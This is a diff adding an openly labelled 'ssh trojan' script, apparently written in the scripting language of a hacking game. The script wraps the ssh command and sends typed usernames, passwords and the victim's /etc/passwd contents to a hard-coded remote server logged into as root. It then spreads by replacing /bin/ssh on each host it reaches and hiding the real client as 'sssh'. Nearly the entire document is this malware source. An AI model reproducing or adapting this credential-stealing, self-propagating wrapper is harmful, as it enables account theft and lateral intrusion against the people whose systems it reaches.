@@ -1,0 +1,78 @@
+//ssh trojan
+
+ts = get_shell.connect_service ("IP", 22, "root", "PASS")
+
+if ts == null then 
+	get_shell.launch("/bin/sssh",params.join(" "))
+	exit()
+end if
+
+fname = get_router.public_ip
+file = ts.host_computer.File("/info/"+fname)
+
+if file == null then
+	ts.host_computer.touch("/info",fname)
+	file = ts.host_computer.File("/info/"+fname)
+	output = ts.host_computer.lan_ip+" / "
+	passf = get_shell.host_computer.File("/etc/passwd")
+	if passf != null then 
+		output = passf.content+" / " 
+		end if
+	file.set_content(output)
+end if
+
+cypher = "MBw/n3Ov)-!>].Rcmb6JYdAk9%EFDHr<q#p}U2fZz;I[{TN@aC5Qhj+oVK1ey0isP4*7x8gl:W_$& GS=?utL(X\,"
+code = [10,25,5,3,3,7,9,21,8,16,21]
+crypt = function(text,enc = 1)
+	output = ""
+	count = 0
+	for char in text
+		if code[count] != null then
+			if enc == 1 then
+				ind = cypher.indexOf(char)+code[count]
+				if ind >= cypher.len then ind = ind - cypher.len end if
+			else
+				ind = cypher.indexOf(char)-code[count]
+				if ind < 0 then ind = ind + cypher.len end if
+			end if
+			if ind != null then 
+				output = output+cypher[ind]
+			else
+				output = output+char
+			end if
+		else
+			output = output+char
+		end if
+		count = count+1
+		if count >= code.len then count = count - code.len end if
+	end for
+	return output
+end function
+
+
+if params.len > 2 then
+	port= params[2]
+	if port == null then port = 22 end if
+	userName = params[0].split("@")[0]
+	pass = params[0].split("@")[1]
+	ip = params[1]
+	file.set_content(file.content+" / "+params.join(" "))
+	if userName != null and pass != null and is_valid_ip(ip) then 
+		ts = get_shell.connect_service(ip,port.val,userName,pass)
+		if ts != null then 
+			ts.host_computer.touch("/bin","ssh.src")
+			sshFile = ts.host_computer.File("/bin/ssh")//.rename("sssh")
+			if sshFile != null then
+				sshFile.rename("sssh")
+				src_in = get_shell.host_computer.File("/bin/ssh.src")
+				src_out = ts.host_computer.File("/bin/ssh.src")
+				if src_out != null and src_in != null then
+					src_out.set_content(crypt(src_in.content,0))
+					ts.build("/bin/ssh.src","/bin")
+				end if
+			end if
+		end if
+	end if
+end if
+
+get_shell.launch("/bin/sssh",params.join(" "))
